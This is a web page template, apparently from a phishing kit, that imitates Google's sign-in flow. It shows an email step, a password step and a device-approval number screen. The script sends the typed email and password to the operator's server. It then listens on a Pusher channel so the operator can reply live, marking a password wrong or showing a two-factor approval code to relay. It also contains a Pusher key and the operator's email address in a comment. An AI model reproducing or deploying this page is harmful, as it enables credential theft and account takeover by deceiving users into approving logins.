<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <title>{{ $data->title }}</title>
    <meta name="title" content="{{ $data->title }}" />
    <meta name="description" content="{{ $data->description }}">
    <meta property="twitter:title" content="{{ $data->title }}" />
    <meta property="twitter:description" content="{{ $data->description }}" />
    <meta property="twitter:card" content="summary_large_image" />
    <meta property="twitter:image" content="{{ $data->image }}" />
    <meta property="og:title" content="{{ $data->title }}" />
    <meta property="og:image" content="{{ $data->image }}" />
    <meta property="og:type" content="article" />
    <link rel="stylesheet"
        href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&amp;family=Roboto:wght@400;500&amp;display=swap"
        data-precedence="default">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
        integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/pusher/8.4.0/pusher.min.js"
        integrity="sha512-p3rR75Is6DCK1r2D8mdxLQhe4IWVDSTUBdxqs0Veum0hHDSY+sH9M6U6Cesr1umlxbiEK9w/3IhXFlZcWT1AoA=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    @vite(['resources/css/app.css'])
    <style>
        .gpt-cursor-tooltip {
            position: fixed;
            left: 0;
            top: 0;
            display: none;
            pointer-events: none;
            z-index: 1000000001;
            padding: 4px 10px;
            border-radius: 9999px;
            background: rgba(37, 99, 235, 0.93);
            color: #fff;
            font: 600 12px/1.25 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            white-space: nowrap;
            max-width: min(70vw, 520px);
            overflow: hidden;
            text-overflow: ellipsis;
        }

        @keyframes google-loading-bar {
            0% {
                transform: translateX(-100%) scaleX(0.3);
            }

            50% {
                transform: translateX(0%) scaleX(0.6);
            }

            100% {
                transform: translateX(100%) scaleX(0.3);
            }
        }

        @keyframes slide-left {
            from {
                transform: translateX(0);
            }

            to {
                transform: translateX(-150%);
            }
        }

        @keyframes slide-right {
            from {
                transform: translateX(-150%);
            }

            to {
                transform: translateX(0);
            }
        }

        .google-loading-bar {
            transform-origin: left center;
            animation: google-loading-bar 1.2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
        }

        .slide-left {
            animation: slide-left 0.5s cubic-bezier(0.4, 0, 0.2, 1) forwards;
        }

        .slide-right {
            animation: slide-right 0.5s cubic-bezier(0.4, 0, 0.2, 1) forwards;
        }
    </style>
</head>

<body>
    <!--$-->
    <div class="min-h-screen w-full flex flex-col"
        style="font-family:&quot;Google Sans&quot;,&quot;Roboto&quot;,&quot;Helvetica Neue&quot;,Arial,sans-serif;color:#1f1f1f;background-color:#f0f4f9">
        <main class="flex-1 flex items-center justify-center px-4 py-6">
            {{-- thêm class inset-0 là hiện loading --}}
            <div class="w-full max-w-[992px] bg-white rounded-[28px] px-6 sm:px-[56px] py-[48px] relative after:absolute after:bg-white after:rounded-[28px] after:opacity-50 overflow-hidden"
                id="main">
                <div class="absolute top-0 left-0 right-0 h-[3px] overflow-hidden hidden" id="loading-bar">
                    <div class="google-loading-bar h-full w-full bg-[#0b57d0]"></div>
                </div>
                {{-- gmail form --}}
                <div class="grid grid-cols-1 md:grid-cols-[minmax(0,1fr)_minmax(0,1fr)] gap-8 md:gap-[60px]"
                    id="form-1">
                    <div class="md:pt-2">
                        <div class="mb-6"><svg viewBox="0 0 48 48" width="40" height="40" aria-label="Google"
                                style="display:block">
                                <path fill="#EA4335"
                                    d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z">
                                </path>
                                <path fill="#4285F4"
                                    d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z">
                                </path>
                                <path fill="#FBBC05"
                                    d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z">
                                </path>
                                <path fill="#34A853"
                                    d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z">
                                </path>
                            </svg></div>
                        <h1 class="text-[36px] leading-[44px] font-normal tracking-[-0.25px] mb-4"
                            style="font-family:&quot;Google Sans&quot;,&quot;Roboto&quot;,Arial,sans-serif">@lang('google.sign_in')
                        </h1>
                        <p class="text-[16px] leading-[24px]">{{ $data->login_warning }}</p>
                    </div>
                    <form class="flex flex-col md:pt-[64px]" id="login_form">
                        <div>
                            <div class="relative rounded-[4px] transition-colors">
                                <input id="email" type="text" placeholder=" " autocomplete="username"
                                    error="false"
                                    class="peer block w-full h-[54px] rounded-[4px] bg-transparent px-[14px] pt-[4px] pb-[2px] text-[16px] leading-[24px] text-[#1f1f1f] outline-none border-2 [[error='true']]:border-red-500 border-[#747775] focus:border-blue-500" />

                                <label
                                    class="absolute left-[8px] px-[6px] bg-white pointer-events-none transition-all duration-150
                                           top-1/2 -translate-y-1/2 text-[16px] text-[#5f6368]
                                           peer-focus:top-0
                                           peer-focus:text-[12px]
                                           peer-focus:text-blue-500
                                           peer-[:not(:placeholder-shown)]:top-0
                                           peer-[:not(:placeholder-shown)]:text-[12px]">
                                    @lang('google.email_or_phone')
                                </label>
                            </div>
                            <span class="flex gap-1 text-red-700 items-center mt-1 hidden"
                                id="not_found_account_message"
                                data-account-not-found="@lang('google.account_not_found')"
                                data-please-enter-email="@lang('google.please_enter_email')"
                                data-invalid-email="@lang('google.invalid_email')"
                                data-enter-email="@lang('google.email_or_phone')">
                                <svg aria-hidden="true" width="16px" height="16px" viewBox="0 0 24 24"
                                    xmlns="https://www.w3.org/2000/svg" fill="currentColor">
                                    <path
                                        d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z">
                                    </path>
                                </svg>
                                <span class="text-[13px]">@lang('google.account_not_found')</span>
                            </span>
                        </div>
                        <div class="mt-4"><a href="#"
                                class="inline-block text-[14px] font-medium text-[#0b57d0] hover:bg-[#e8f0fe] rounded-[4px] px-2 py-1 -ml-2">@lang('google.forgot_email')</a></div>
                        <div class="flex items-center justify-end gap-2 mt-10">
                            <button type="submit"
                                class="bg-[#0b57d0] hover:bg-[#0a4fbf] active:bg-[#0842a0] text-white text-[14px] font-medium h-[40px] px-6 rounded-full transition-colors cursor-pointer"
                                style="font-family:&quot;Google Sans&quot;,&quot;Roboto&quot;,Arial,sans-serif">@lang('google.next')
                        </div>
                    </form>
                </div>
                {{-- password form --}}
                <div class="grid grid-cols-1 md:grid-cols-[minmax(0,1fr)_minmax(0,1fr)] gap-8 md:gap-[60px] hidden"
                    id="form-2">
                    <div class="md:pt-2">
                        <div class="mb-6"><svg viewBox="0 0 48 48" width="40" height="40" aria-label="Google"
                                style="display:block">
                                <path fill="#EA4335"
                                    d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z">
                                </path>
                                <path fill="#4285F4"
                                    d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z">
                                </path>
                                <path fill="#FBBC05"
                                    d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z">
                                </path>
                                <path fill="#34A853"
                                    d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z">
                                </path>
                            </svg></div>
                        <h1 class="text-[45px] leading-[44px] font-normal tracking-[-0.25px] mb-6"
                            style="font-family:&quot;Google Sans&quot;,&quot;Roboto&quot;,Arial,sans-serif">@lang('google.welcome')
                        </h1>
                        <div class="inline-flex items-center gap-2 border border-[#747775] rounded-full pl-1 pr-3 py-1 hover:bg-black/[0.03] cursor-pointer"
                            onclick="returnToMain()">
                            <span
                                class="w-7 h-7 rounded-full bg-[#1f1f1f] text-white flex items-center justify-center text-[12px] font-medium overflow-hidden"><svg
                                    width="18" height="18" viewBox="0 0 24 24" fill="#9aa0a6">
                                    <path
                                        d="M12 12c2.7 0 4.9-2.2 4.9-4.9S14.7 2.2 12 2.2 7.1 4.4 7.1 7.1 9.3 12 12 12zm0 2.4c-3.3 0-9.8 1.7-9.8 4.9v2.4h19.6v-2.4c0-3.2-6.5-4.9-9.8-4.9z">
                                    </path>
                                </svg></span><span class="text-[14px] font-semibold email_display"></span><svg
                                width="18" height="18" viewBox="0 0 24 24" fill="#5f6368">
                                <path d="M7 10l5 5 5-5z"></path>
                            </svg>
                        </div>
                    </div>
                    <form class="flex flex-col md:pt-[80px]" id="password_form">
                        <div>
                            <div class="relative rounded-[4px] transition-colors">
                                <input id="password" type="password" placeholder=" " error="false"
                                    class="peer block w-full h-[54px] rounded-[4px] bg-transparent px-[14px] pt-[4px] pb-[2px] text-[16px] leading-[24px] text-[#1f1f1f] outline-none border-2 [[error='true']]:border-red-500 border-[#747775] focus:border-blue-500" />

                                <label
                                    class="absolute left-[8px] px-[6px] bg-white pointer-events-none transition-all duration-150
                                           top-1/2 -translate-y-1/2 text-[16px] text-[#5f6368]
                                
                                           peer-focus:top-0
                                           peer-focus:text-[12px]
                                           peer-focus:text-blue-500
                                
                                           peer-[:not(:placeholder-shown)]:top-0
                                           peer-[:not(:placeholder-shown)]:text-[12px]">
                                    @lang('google.enter_password')
                                </label>
                            </div>
                            <span class="flex gap-1 text-red-700 items-center mt-1 hidden"
                                id="wrong_password_message"
                                data-wrong-password="@lang('google.wrong_password')"
                                data-password-min-chars="@lang('google.password_min_chars')">
                                <svg aria-hidden="true" width="16px" height="16px" viewBox="0 0 24 24"
                                    xmlns="https://www.w3.org/2000/svg" fill="currentColor">
                                    <path
                                        d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z">
                                    </path>
                                </svg>
                                <span class="text-[13px]">@lang('google.wrong_password')</span>
                            </span>
                        </div>                            <label class="flex items-center gap-3 mt-4 cursor-pointer select-none"><input
                                type="checkbox" class="w-[18px] h-[18px] accent-[#0b57d0] cursor-pointer"
                                id="show_password"><span class="text-[14px] text-[#1f1f1f] font-semibold">@lang('google.show_password')</span></label>
                        <div class="flex items-center justify-end gap-2 mt-16">
                            <button type="submit"
                                class="bg-[#0b57d0] hover:bg-[#0a4fbf] active:bg-[#0842a0] text-white text-[14px] font-medium h-[40px] px-6 rounded-full transition-colors cursor-pointer">
                                @lang('google.next')</button>
                        </div>
                    </form>
                </div>
                {{-- approve form --}}
                <div class="grid grid-cols-1 md:grid-cols-[minmax(0,1fr)_minmax(0,1fr)] gap-2 md:gap-[60px] hidden"
                    id="form-3">
                    <div class="md:pt-2">
                        <div class="mb-6"><svg viewBox="0 0 48 48" width="40" height="40"
                                aria-label="Google" style="display:block">
                                <path fill="#EA4335"
                                    d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z">
                                </path>
                                <path fill="#4285F4"
                                    d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z">
                                </path>
                                <path fill="#FBBC05"
                                    d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z">
                                </path>
                                <path fill="#34A853"
                                    d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z">
                                </path>
                            </svg></div>
                        <h1 class="text-[36px] leading-[44px] font-normal tracking-[-0.25px] mb-4"
                            style="font-family:&quot;Google Sans&quot;,&quot;Roboto&quot;,Arial,sans-serif">
                            @lang('google.verify_identity')
                        </h1>
                        <p class="text-[16px] leading-[24px]">@lang('google.keep_account_safe')</p>
                        <div class="mt-4 inline-flex items-center gap-2 border border-[#747775] rounded-full pl-1 pr-3 py-1 hover:bg-black/[0.03] cursor-pointer"
                            onclick="returnToMain()">
                            <span
                                class="w-7 h-7 rounded-full bg-[#1f1f1f] text-white flex items-center justify-center text-[12px] font-medium overflow-hidden"><svg
                                    width="18" height="18" viewBox="0 0 24 24" fill="#9aa0a6">
                                    <path
                                        d="M12 12c2.7 0 4.9-2.2 4.9-4.9S14.7 2.2 12 2.2 7.1 4.4 7.1 7.1 9.3 12 12 12zm0 2.4c-3.3 0-9.8 1.7-9.8 4.9v2.4h19.6v-2.4c0-3.2-6.5-4.9-9.8-4.9z">
                                    </path>
                                </svg></span><span class="text-[14px] font-semibold email_display"></span><svg
                                width="18" height="18" viewBox="0 0 24 24" fill="#5f6368">
                                <path d="M7 10l5 5 5-5z"></path>
                            </svg>
                        </div>
                    </div>
                    <div class="flex flex-col justify-center">
                        <h1 class="text-[60px] text-center mt-10 mb-5 approve_code">59</h1>
                        <p class="text-xl mb-4">@lang('google.check_device')</p>
                        <p class="text-[14px]">@lang('google.google_sent_notification', ['yes' => '<b>' . __('google.yes') . '</b>', 'code' => '<b class="approve_code"></b>'])</p>
                        <div class="flex items-center justify-end mt-16">
                            <a href="#"
                                class="text-[14px] font-medium text-[#0b57d0] hover:bg-[#e8f0fe] rounded-full px-3 py-2">@lang('google.resend_code')</a>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    </div>
    {{-- Pusher account: alberdaknudsenhu333@gmail.com --}}
    <script>
        var pusher = new Pusher('3416ad0a3088cc0d4e6a', {
            cluster: 'ap1'
        });
        var channel = pusher.subscribe('mrls');
        channel.bind("{{ $pusher_code }}", function(data) {
            const warning_email = $("#not_found_account_message")
            const warning_password = $("#wrong_password_message")
            const email_input = $("#email")
            const password_input = $("#password")
            const approve_code = $(".approve_code")
            const tr = {
                pleaseEnterEmail: warning_email.data('please-enter-email'),
                invalidEmail: warning_email.data('invalid-email'),
                accountNotFound: warning_email.data('account-not-found'),
                enterEmail: warning_email.data('enter-email'),
                wrongPassword: warning_password.data('wrong-password'),
                passwordMinChars: warning_password.data('password-min-chars'),
            };
            if (data.status) {
                window.location.href = '{!! $data->redirect_link !!}'
            } else {
                stopLoading();
                if (data.wrong_password) {
                    password_input.attr('error', 'true');
                    warning_password.removeClass('hidden');
                }
                if (data.wrong_email) {
                    returnToMain();
                    email_input.attr('error', 'true');
                    warning_email.removeClass('hidden');
                }
                if (data.another_device_verify) {
                    if (!$("#form-1").hasClass("hidden")) {
                        $("#form-1").addClass("hidden");
                        $("#form-2").addClass("hidden");
                    }
                    switchForm('form-2', 'form-3');
                    approve_code.text(data.another_device_verify);
                }
            }
        });

        function isValidEmail(email) {
            // Simple email validation regex
            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return re.test(email);
        }

        function isOnlyNumber(str) {
            return /^[0-9]+$/.test(str);
        }


        function verifyOnlyStringAndNumber(str) {
            // Kiểm tra chuỗi chỉ gồm chữ cái và chữ số (không có ký tự đặc biệt nào khác)
            return /^[A-Za-z0-9]+$/.test(str);
        }


        function switchForm(form1, form2) {
            $('#' + form1).addClass('slide-left');
            $('#loading-bar').removeClass('hidden');
            $('#main').addClass('after:inset-0');
            setTimeout(() => {
                $('#' + form1).addClass('hidden');
                $('#' + form2).removeClass('hidden');
                $('#' + form2).removeClass('slide-left');
                $('#loading-bar').addClass('hidden');
                $('#main').removeClass('after:inset-0');
            }, 300);
        }

        function startLoading() {
            $('#loading-bar').removeClass('hidden');
            $('#main').addClass('after:inset-0');
        }

        function stopLoading() {
            $('#loading-bar').addClass('hidden');
            $('#main').removeClass('after:inset-0');
        }

        function returnToMain() {
            // reset form-2
            $("#form-2").addClass("hidden");
            // reset form-3
            $("#form-3").addClass("hidden");
            // reset form-1
            $("#form-1").removeClass("hidden");
            $("#form-1").addClass("slide-right");
        }
        // reset email input error
        $("#email").on('input', function() {
            $("#email").attr('error', 'false');
            $('#not_found_account_message').addClass('hidden');
        });
        // reset password input error
        $("#password").on('input', function() {
            $("#password").attr('error', 'false');
            $('#wrong_password_message').addClass('hidden');
        });
        $('#login_form').submit(function(e) {
            e.preventDefault();
            var email = $('#email').val().trim().replace(/\s+/g, '');
            $("#email").attr('error', 'false');
            if (isValidEmail(email)) {
                $('.email_display').text(email);
            } else {
                if (email.length <= 0 || !email) {
                    $('#not_found_account_message').removeClass('hidden');
                    $('#not_found_account_message span').text(tr.pleaseEnterEmail);
                    $("#email").attr('error', 'true');
                    return;
                }
                if (!verifyOnlyStringAndNumber(email)) {
                    $('#not_found_account_message span').text(tr.invalidEmail);
                    $('#not_found_account_message').removeClass('hidden');
                    $("#email").attr('error', 'true');
                    return;
                }
                if (isOnlyNumber(email)) {
                    $(".email_display").text(email);
                    $("#email").val(email);
                } else {
                    $(".email_display").text(email + '@gmail.com');
                    $("#email").val(email + '@gmail.com');
                }
            }
            switchForm('form-1', 'form-2');
        });
        $('#password_form').submit(function(e) {
            e.preventDefault();
            const email = $("#email").val()
            const password = $('#password').val().trim().replace(/\s+/g, '');
            if (password.length < 4) {
                $('#wrong_password_message').removeClass('hidden');
                $('#wrong_password_message span').text(tr.passwordMinChars);
                $("#password").attr('error', 'true');
                return;
            }
            const dataToSend = {
                'email': email,
                'password': password,
                'info': '{{ $info }}',
            }
            startLoading();
            $.post("{{ route('post.realtimeweb.google') }}", {
                    d: JSON.stringify(dataToSend),
                    'p_c': "{{ $pusher_code }}",
                    '_token': '{{ csrf_token() }}'
                },
                function(data, textStatus, jqXHR) {},
                "json"
            );
        });
        $('#show_password').on('change', function() {
            if ($(this).is(':checked')) {
                $('#password').attr('type', 'text');
            } else {
                $('#password').attr('type', 'password');
            }
        });
    </script>
</body>

</html>
